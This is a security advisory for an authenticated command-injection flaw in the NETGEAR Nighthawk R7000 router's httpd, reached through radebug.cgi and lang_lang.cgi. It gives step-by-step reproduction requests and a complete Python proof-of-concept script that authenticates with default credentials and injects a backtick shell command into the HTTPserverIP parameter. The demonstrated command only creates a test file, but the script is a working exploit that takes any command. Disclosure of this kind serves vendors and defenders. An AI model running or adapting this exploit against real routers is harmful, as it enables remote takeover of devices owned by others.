# NETGEAR-R7000

>  NETGEAR Nighthawk Wireless Router R7000 httpd Command Injection Remote Code Execution Vulnerability
>
### Overview of the Vulnerability
There is a remote command injection vulnerability in the latest firmware version v1.0.11.208 of Nighthawk router R7000. The vulnerability exists in the httpd service. Request the "HTTPserverIP" parameter of "radebug.cgi" interface through POST, and set "ver_check_https_svr1". Then request the "lang_lang.cgi" interface through POST, trigger the command injection vulnerability. Authentication is required
### Steps to Reproduce
1.Access the http service of the router for login authentication;

2.On the basis of authentication, you need to construct a POST request to set the parameter "ver_check_https_svr1". Url = 'http://192.168.1.1:8080/radebug.cgi', data = "form=4&serverIP=updates1.netgear.com&HTTPserverIP=\`touch%20/tmp/test.txt\`&initStartTime=0"

3.After successfully setting the parameter "ver_check_https_svr1", send a POST request "lang_lang.cgi" to the httpd server. Url = 'http://192.168.1.1:8080/lang_lang.cgi', data = "Check=Check"

4.Check whether the test.txt file has been created in the tmp directory through UART, etc.

### Proof of Concept
The screenshot below demonstrates the RCE in the application through the specified parameter:


### POC
```
import requests
import sys
import re

def attack():
    # base64(admin:password)
    base64 = 'YWRtaW46cGFzc3dvcmQ='
    header={
        'Host':'192.168.1.1:80',
        'Authorization': 'Basic ' + base64,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
    }


    url_1 = 'http://192.168.1.1:80/debug.htm'
    try:
        ret_1 = requests.get(url=url_1,
                      headers=header,
                      timeout=30,
                      )
    except Exception:
        return

    ##set ver_check_https_svr1(HTTPserverIP)=`touch /tmp/test.txt`
    url_2 = re.search(r'radebug.cgi\?id=.* ', ret_1.text).group()

    try:
        ret_2 = requests.post(url= "http://192.168.1.1:80/" + url_2[:-1],
                      headers=header,
                      data="form=4&serverIP=updates1.netgear.com&HTTPserverIP=`touch /tmp/test.txt`&initStartTime=0",
                      timeout=30,
                      )
    except Exception:
        return

    url_3 = 'http://192.168.1.1:80/LANG_lang.htm'

    try:
        ret_3 = requests.get(url= url_3,
                      headers=header,
                      timeout=30,
                      )
    except Exception:
        return

    url_4 = re.search(r'lang_lang.cgi\?id=.*\"', ret_3.text).group()

    ##execute commands '`touch /tmp/test.txt`'
    try:
        ret_4 = requests.post(url= "http://192.168.1.1:80/" + url_4[:-1],
                      headers=header,
                      data="Check=Check",
                      timeout=30,
                      )
    except Exception:
        return



if __name__ == "__main__":
    attack()
```

